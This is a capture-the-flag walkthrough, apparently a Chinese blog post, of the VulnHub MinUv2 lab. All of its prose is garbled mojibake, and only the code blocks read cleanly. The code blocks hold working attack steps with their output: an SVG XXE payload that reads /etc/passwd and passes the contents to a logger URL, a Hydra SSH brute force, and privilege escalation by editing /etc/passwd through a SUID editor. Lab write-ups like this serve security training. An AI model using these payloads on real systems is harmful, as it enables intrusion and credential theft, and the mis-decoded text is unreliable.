I"´M<h1 id="åºè¨€">åºè¨€</h1>
<p>hello,å„ä½ã€‚æœ€è¿‘é—²æ¥æ— äº‹ï¼Œå·¥ä½œä¹‹ä½™å·å·ç”¨å…¬å¸ç”µè„‘æµ‹è¯•å…¥ä¾µäº†ä¸€ä¸ªlinuxé¶æœºï¼Œé‚è®°å½•ä¸‹ã€‚ï¼ˆæ‰‹åŠ¨ç‹—å¤´ï¼‰
è¿™ä¸ªé¶æœºæœ¬èº«éš¾åº¦é€‚ä¸­ï¼Œå¤ç°äº†svgçš„ä»£ç æ‰§è¡Œæ¼æ´ä¸”è¦æ±‚å¯¹linuxçš„ç³»ç»Ÿå‘½ä»¤è¾ƒä¸ºç†Ÿæ‚‰ï¼›svgå¤§ä½“æ¥è¯´æ˜¯ä¸€ç§å›¾åƒæ–‡ä»¶æ ¼å¼ï¼ŒåŸºäºXMLï¼Œç”±W3Cè”ç›Ÿè¿›è¡Œå¼€å‘çš„ï¼Œæ”¯æŒç½‘é¡µæ‰“å¼€ï¼Œç¼–è¾‘æ–¹ä¾¿ç­‰ã€‚å¯ä»¥è‡ªè¡Œæ·±å…¥æœç´¢~å„ä½å¤§ä½¬è§ç¬‘ã€‚</p>
<h2 id="ä¸€é¶æœºç®€ä»‹">ä¸€ã€é¶æœºç®€ä»‹</h2>
<p>minUv2<br />
ä¸‹è½½åœ°å€
Download (Mirror): https://download.vulnhub.com/minu/MinUv2.ova.7z
Download (Torrent): https://download.vulnhub.com/minu/MinUv2.ova.7z.torrent</p>
<h2 id="äºŒå®æˆ˜">äºŒã€å®æˆ˜</h2>
<p>æ±Ÿæ¹–è§„çŸ©ï¼Œç¥å™¨å¼€è·¯ï¼šé¦–å…ˆå…ˆç”¨<code class="highlighter-rouge">Nmap</code>æ‰«æç¡®å®šé¶æœºåœ°å€ã€‚å‘ç°é¶æœºipã€‚
è¿™é‡Œé¶æœºåªæ”¯æŒvboxï¼Œæ‰€ä»¥å¾—æ¡¥æ¥é€šä¿¡ï¼Œæ‰“ç è¯·è°…è§£~
<img src="https://p2.ssl.qhimg.com/t0167faf934cb9977ca.png" alt="" />
ç¡®å®šipç›´æ¥ç«¯å£æ‰«æ~
<img src="https://p4.ssl.qhimg.com/t011687f39e33bbe3e4.png" alt="" />
å‘ç°åªå¼€æ”¾äº†ä¸¤ä¸ªç«¯å£ï¼š<code class="highlighter-rouge">22ã€3306</code>ç«¯å£ã€‚22ç«¯å£æš‚æ—¶å…ˆæ”¾ç€ä¸ç®¡ï¼Œå’±ä»¬çœ‹çœ‹3306ç«¯å£ã€‚
æ˜¯ä¸€ä¸ªwebé¡µé¢ï¼Œemmmm.ä¸»è§’ç™»åœºï¼Œsvgå›¾åƒ~
<img src="https://p0.ssl.qhimg.com/t019035849ce7a48ccf.png" alt="" /></p>
<h2 id="ä¸‰å‘ç°æ¼æ´">ä¸‰ã€å‘ç°æ¼æ´</h2>
<p>å°å¼Ÿèµ¶ç´§dirbæ‰«æä¸€æ³¢ï¼Œæœç„¶æœ‰å‘ç°ã€‚<br /></p>
<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="c1">#æ‰«æ3306ç«¯å£ä¸‹çš„htmlåç¼€çš„æ–‡ä»¶</span><span class="w">
</span><span class="nv">dirb</span><span class="w"> </span><span class="nv">http</span><span class="p">:</span><span class="o">//</span><span class="err">$_</span><span class="nv">ip</span><span class="p">:</span><span class="nv">port</span><span class="w"> </span><span class="o">-</span><span class="nv">X</span><span class="w"> </span><span class="p">.</span><span class="nv">html</span><span class="w">
</span><span class="c1">--------------</span><span class="w">
</span><span class="o">+</span><span class="w"> </span><span class="nv">http</span><span class="p">:</span><span class="o">//</span><span class="err">$_</span><span class="nv">ip</span><span class="p">:</span><span class="nv">port</span><span class="o">/</span><span class="nv">upload</span><span class="p">.</span><span class="nv">html</span><span class="w"> </span><span class="p">(</span><span class="nv">CODE</span><span class="p">:</span><span class="mi">200</span><span class="err">|</span><span class="nv">SIZE</span><span class="p">:</span><span class="mi">908</span><span class="p">)</span><span class="w">
</span><span class="c1">--------------</span><span class="w">
</span><span class="nv">DOWNLOADED</span><span class="p">:</span><span class="w"> </span><span class="mi">4612</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">FOUND</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p>å‘ç°äº†ä¸Šä¼ ç½‘é¡µï¼Œä¸”åªèƒ½ä¸Šä¼ svgã€imgæ–‡ä»¶ï¼ŒåˆæƒŠåˆå–œã€‚expæœç´¢ä¸€å“ˆæ‰¾åˆ°pocï¼ŒéªŒè¯ä¸€ä¸‹æ¼æ´çš„å­˜åœ¨ã€‚pocä»£ç å¦‚ä¸‹ï¼š</p>
<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="c1">#pocä¸Šä¼ ä¸Šå»é¡µé¢å›æ˜¾</span><span class="w">
</span><span class="c1">#&lt;!DOCTYPE svg [</span><span class="w">
</span><span class="o">&lt;</span><span class="p">!</span><span class="nv">ELEMENT</span><span class="w"> </span><span class="nv">svg</span><span class="w"> </span><span class="nv">ANY</span><span class="w"> </span><span class="o">&gt;</span><span class="w">
</span><span class="o">&lt;</span><span class="p">!</span><span class="nv">ENTITY</span><span class="w"> </span><span class="nv">xxe</span><span class="w"> </span><span class="nv">SYSTEM</span><span class="w"> </span><span class="s2">"/etc/passwd"</span><span class="o">&gt;</span><span class="w">
</span><span class="err">]</span><span class="o">&gt;</span><span class="w">
</span><span class="o">&lt;</span><span class="nv">svg</span><span class="w"> </span><span class="nb">version</span><span class="o">=</span><span class="s2">"1.0"</span><span class="w"> </span><span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/2000/svg"</span><span class="w"> </span><span class="na">width</span><span class="o">=</span><span class="s2">"19000px"</span><span class="w"> </span><span class="nv">xmlns</span><span class="p">:</span><span class="nv">xlink</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xlink"</span><span class="w"> </span><span class="o">&gt;</span><span class="w">
</span><span class="o">&lt;</span><span class="nb">text</span><span class="w"> </span><span class="nv">x</span><span class="o">=</span><span class="s2">"-1000"</span><span class="w"> </span><span class="nv">y</span><span class="o">=</span><span class="s2">"-1000"</span><span class="w"> </span><span class="o">&gt;&amp;</span><span class="nv">xxe</span><span class="err">;</span><span class="o">&lt;/</span><span class="nb">text</span><span class="o">&gt;</span><span class="w">
</span><span class="o">&lt;</span><span class="nv">circle</span><span class="w"> </span><span class="nv">cx</span><span class="o">=</span><span class="s2">"50"</span><span class="w"> </span><span class="nv">cy</span><span class="o">=</span><span class="s2">"50"</span><span class="w"> </span><span class="nv">r</span><span class="o">=</span><span class="s2">"40"</span><span class="w"> </span><span class="nv">stroke</span><span class="o">=</span><span class="s2">"black"</span><span class="w"> </span><span class="nv">stroke</span><span class="o">-</span><span class="na">width</span><span class="o">=</span><span class="s2">"3"</span><span class="w"> 		</span><span class="nv">fill</span><span class="o">=</span><span class="s2">"red"</span><span class="w"> </span><span class="o">/&gt;</span><span class="w">
</span><span class="o">&lt;</span><span class="nv">script</span><span class="o">&gt;</span><span class="w">
</span><span class="nv">var</span><span class="w"> </span><span class="nv">logger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"http://localhost/?file="</span><span class="w"> </span><span class="o">+</span><span class="w">
</span><span class="nv">encodeURIComponent</span><span class="p">(</span><span class="na">document</span><span class="p">.</span><span class="nv">getElementsByTagName</span><span class="p">(</span><span class="s2">"text"</span><span class="p">)</span><span class="w">	</span><span class="err">[</span><span class="mi">0</span><span class="err">]</span><span class="p">.</span><span class="nv">innerHTML</span><span class="p">)</span><span class="err">;</span><span class="w">
</span><span class="na">document</span><span class="p">.</span><span class="nv">createElementNS</span><span class="p">(</span><span class="err">'</span><span class="nv">http</span><span class="p">:</span><span class="o">//</span><span class="nv">www</span><span class="p">.</span><span class="nv">w3</span><span class="p">.</span><span class="nv">org</span><span class="o">/</span><span class="mi">2000</span><span class="o">/</span><span class="nv">svg</span><span class="err">'</span><span class="p">,</span><span class="err">'</span><span class="na">image</span><span class="err">'</span><span class="p">).</span><span class="nv">setAttributeNS</span><span class="p">(</span><span class="err">'</span><span class="nv">http</span><span class="p">:</span><span class="o">//</span><span class="nv">www</span><span class="p">.</span><span class="nv">w3</span><span class="p">.</span><span class="nv">org</span><span class="o">/</span><span class="mi">1999</span><span class="o">/</span><span class="nv">xlink</span><span class="err">'</span><span class="p">,</span><span class="err">'</span><span class="nv">href</span><span class="err">'</span><span class="p">,</span><span class="w"> </span><span class="nv">logger</span><span class="p">)</span><span class="err">;</span><span class="w">
</span><span class="o">&lt;/</span><span class="nv">script</span><span class="o">&gt;&lt;/</span><span class="nv">svg</span><span class="o">&gt;</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p><br />
æœç„¶æœ‰<code class="highlighter-rouge">xxe</code>æ¼æ´ï¼Œä½†æ˜¯éªŒè¯äº†æ¼æ´ä¸èƒ½è®©æˆ‘ä»¬æœ‰å®é™…çš„æ¸—é€è¿›å±•ï¼Œåªèƒ½å¯¹ä¸€äº›æ–‡ä»¶å†…å®¹è¿›è¡ŒæŸ¥çœ‹ï¼Œæ— æ³•å¾—åˆ°shellï¼Œè¦æ€ä¹ˆåŠå‘¢ï¼Ÿ
<img src="https://p1.ssl.qhimg.com/t0163eb735e597071e2.png" alt="" /></p>

<h2 id="å››get-shell">å››ã€get shell</h2>
<p>å°±åœ¨å°å¼Ÿæ„çœ‰è‹¦è„¸çš„æ—¶å€™ï¼Œå¿½ç„¶çœ‹åˆ°æœ€åä¸€è¡Œç”¨æˆ·åçš„è¿›ç¨‹æ˜¯/bin/ashï¼Œæƒ³åˆ°ash shellä¼šæœ‰å†å²çºªå½•ï¼Œèµ¶ç´§é‡æ–°ä¸Šä¼ ä¸€ä¸ªpocéªŒè¯æƒ³æ³•ã€‚å›æ˜¾å†…å®¹ï¼š<br /></p>
<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="s2">"./ash.history"</span><span class="err">è·å–~</span><span class="w">
</span><span class="nv">Useradd</span><span class="w"> </span><span class="err">â€“</span><span class="nv">D</span><span class="w"> </span><span class="nv">bossdonttrackme</span><span class="w"> </span><span class="err">â€“</span><span class="nv">p</span><span class="w"> </span><span class="nv">superultrapass3</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p>æ ¹æ®æ‰€å¾—çš„å†…å®¹ç”Ÿæˆç”¨æˆ·å­—å…¸ï¼ˆpasswdå›æ˜¾çš„ç”¨æˆ·åï¼‰ï¼Œå¯†ç å­—å…¸ã€‚ç”¨Hydraè·‘ä¸€ä¸‹ã€‚</p>
<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="c1">##hydra -L /root/Documents/test/minu/use.txt -P /root/Documents/test/minu/passwd.txt ssh://$_ip</span><span class="w">
</span><span class="nv">Hydra</span><span class="w"> </span><span class="nv">v8</span><span class="p">.</span><span class="mf">9.1</span><span class="w"> </span><span class="p">(</span><span class="nv">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="nv">van</span><span class="w"> </span><span class="nv">Hauser</span><span class="o">/</span><span class="nv">THC</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">Please</span><span class="w"> </span><span class="nv">do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="nv">use</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nv">military</span><span class="w"> </span><span class="ow">or</span><span class="w"> 
</span><span class="nv">secret</span><span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="nv">organizations</span><span class="p">,</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="nb">for</span><span class="w"> </span><span class="nv">illegal</span><span class="w"> </span><span class="nv">purposes</span><span class="p">.</span><span class="w">
</span><span class="err">[</span><span class="nv">WARNING</span><span class="err">]</span><span class="w"> </span><span class="nv">Many</span><span class="w"> </span><span class="nv">SSH</span><span class="w"> </span><span class="nv">configurations</span><span class="w"> </span><span class="nv">limit</span><span class="w"> </span><span class="nb">the</span><span class="w"> </span><span class="nv">number</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nv">parallel</span><span class="w"> </span><span class="nv">tasks</span><span class="p">,</span><span class="w"> </span><span class="k">it</span><span class="w"> </span><span class="ow">is</span><span class="w">
</span><span class="nv">recommended</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="nv">reduce</span><span class="w"> </span><span class="nb">the</span><span class="w"> </span><span class="nv">tasks</span><span class="p">:</span><span class="w"> </span><span class="nv">use</span><span class="w"> </span><span class="o">-</span><span class="nv">t</span><span class="w"> </span><span class="mi">4</span><span class="w">	</span><span class="err">[</span><span class="nv">DATA</span><span class="err">]</span><span class="w"> </span><span class="nv">max</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="nv">tasks</span><span class="w"> </span><span class="nv">per</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nv">server</span><span class="p">,</span><span class="w"> </span><span class="nv">overall</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="nv">tasks</span><span class="p">,</span><span class="w"> </span><span class="mi">30</span><span class="w"> </span><span class="nv">login</span><span class="w"> </span><span class="nv">tries</span><span class="w"> </span><span class="p">(</span><span class="nv">l</span><span class="p">:</span><span class="mi">30</span><span class="o">/</span><span class="nv">p</span><span class="p">:</span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="err">~</span><span class="mi">2</span><span class="w"> </span><span class="nv">tries</span><span class="w"> </span><span class="nv">per</span><span class="w"> </span><span class="nv">task</span><span class="w">
</span><span class="err">[</span><span class="nv">DATA</span><span class="err">]</span><span class="w"> </span><span class="nv">attacking</span><span class="w"> </span><span class="nv">ssh</span><span class="p">:</span><span class="o">//</span><span class="err">$_</span><span class="nv">ip</span><span class="p">:</span><span class="mi">22</span><span class="o">/</span><span class="w">
</span><span class="err">[</span><span class="mi">22</span><span class="err">][</span><span class="nv">ssh</span><span class="err">]</span><span class="w"> </span><span class="nv">host</span><span class="p">:</span><span class="w"> </span><span class="err">$_</span><span class="nv">ip</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="nv">login</span><span class="p">:</span><span class="w"> </span><span class="nv">employee</span><span class="w"> </span><span class="nv">password</span><span class="p">:</span><span class="w"> </span><span class="nv">superultrapass3</span><span class="o">**</span><span class="w">
</span><span class="mi">1</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="na">target</span><span class="w"> </span><span class="nv">successfully</span><span class="w"> </span><span class="nv">completed</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nv">valid</span><span class="w"> </span><span class="nv">password</span><span class="w"> </span><span class="nv">found</span><span class="w">
</span><span class="c1">##è·‘å‡ºæ¥è´¦å·å¯†ç employeeï¼šuperultrapass3ï¼Œsshè¿ä¸Šå»ã€‚</span><span class="w">
</span><span class="c1">##è¿æ¥ä¸Šå»æŸ¥çœ‹ä¸€ä¸‹åŸºæœ¬ä¿¡æ¯ </span><span class="w">
</span><span class="nv">ssh</span><span class="w"> </span><span class="nv">employee</span><span class="err">@</span><span class="nv">ip</span><span class="w">
</span><span class="nv">whoami</span><span class="w">
</span><span class="na">id</span><span class="w"> </span><span class="err">|</span><span class="w"> </span><span class="nv">find</span><span class="w"> </span><span class="o">-</span><span class="nv">perm</span><span class="w"> </span><span class="o">-</span><span class="mi">4000</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="nv">dev</span><span class="o">/</span><span class="nv">null</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="https://p5.ssl.qhimg.com/t013dbd6663c5c9720e.png" alt="" /></p>
<h2 id="äº”ææƒ">äº”ã€ææƒ</h2>
<p>å‘ç°<code class="highlighter-rouge">micro</code>å’Œ<code class="highlighter-rouge">bbsuid</code>ä¸éœ€è¦é«˜æƒé™ï¼Œè¿è¡Œä¸€ä¸‹ï¼Œå‘ç°microæ˜¯ä¸€ä¸ª<code class="highlighter-rouge">æ–‡æœ¬ç¼–è¾‘å·¥å…·å™¨</code>ã€‚æ¥ä¸‹æ¥å°±ç®€å•äº†ã€‚</p>
<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="c1">#ç”Ÿæˆä¸€ä»½hashå€¼ï¼Œæ›¿æ¢æ‰passwdçš„ç”¨æˆ·å¯†ç ï¼Œè¿™æ ·å¯†ç å°±å·²çŸ¥äº†ã€‚</span><span class="w">
</span><span class="c1">#ç”¨microç¼–è¾‘å™¨æ‰“å¼€passwdæ–‡ä»¶ï¼Œæ›¿æ¢rootå¯†ç ä¿å­˜å³å¯</span><span class="w">
</span><span class="nv">passwd</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="w"> </span><span class="o">-</span><span class="nv">salty</span><span class="w"> </span><span class="nv">root</span><span class="w"> </span><span class="nv">admin123</span><span class="p">(</span><span class="err">éšæ„</span><span class="p">)</span><span class="w">
</span><span class="nv">cat</span><span class="w"> </span><span class="o">/</span><span class="nv">etc</span><span class="o">/</span><span class="nv">passwd</span><span class="w"> </span><span class="err">|</span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">micro</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="https://p5.ssl.qhimg.com/t0198aaa755e6394b0f.png" alt="" />
è¿™æ ·æˆ‘ä»¬å°±å·²çŸ¥rootå¯†ç äº†ï¼Œç›´æ¥åˆ‡æ¢ç”¨æˆ·</p>
<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="nv">minuv2</span><span class="p">:</span><span class="err">~$</span><span class="w"> </span><span class="nv">su</span><span class="w"> </span><span class="nv">root</span><span class="w">
</span><span class="nv">Password</span><span class="p">:</span><span class="w"> 
</span><span class="nv">minuv2</span><span class="p">:</span><span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">employee</span><span class="c1"># whoami</span><span class="w">
</span><span class="nv">root</span><span class="w">
</span><span class="nv">minuv2</span><span class="p">:</span><span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">employee</span><span class="c1">#</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="https://p2.ssl.qhimg.com/t01aefe59b403bdcc5c.png" alt="" />
è·å¾—flag~æ„Ÿè°¢å„ä½</p>

:ET